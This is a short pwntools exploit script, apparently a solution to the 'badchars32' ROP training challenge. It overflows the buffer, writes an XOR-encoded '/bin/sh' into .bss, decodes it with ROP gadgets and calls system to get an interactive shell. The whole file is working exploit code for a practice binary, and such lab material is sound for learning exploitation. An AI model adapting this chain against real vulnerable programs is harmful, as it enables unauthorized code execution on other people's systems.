from pwn import *

CAMO = 0x21

def xor(i):
    return i ^ CAMO
    
def build_conv(c):
    return bytes([xor(i) for i in c])

_cmd_conv = build_conv(b"/bin/sh")
_bss = 0x0804a044
_system = p32(0x080484e0)
_pop_x = p32(0x08048896)  # pop ebx ; pop ecx ; ret
_xor_cl = p32(0x08048890) # xor byte ptr [ebx], cl ; ret
_pop_i = p32(0x08048899)  # pop esi ; pop edi ; ret
_mov = p32(0x08048893)    # mov dword ptr [edi], esi ; ret

payload = b"A" * 40 + b"EBP4"

def addr_mov(b, bss):
    return _pop_i\
          + p32(b)\
          + p32(bss)\
          + _mov

payload += addr_mov(int.from_bytes(_cmd_conv[:4], "little"), _bss)
payload += addr_mov(int.from_bytes(_cmd_conv[4:], "little"), _bss + 4)

for i in range(len(_cmd_conv)):
    payload += _pop_x
    payload += p32(_bss + i)
    payload += p32(CAMO)
    payload += _xor_cl

payload += _system
payload += b"fake"
payload += p32(_bss)

badchars32 = process('badchars32')
badchars32.recv()
badchars32.sendline(payload)
badchars32.interactive()

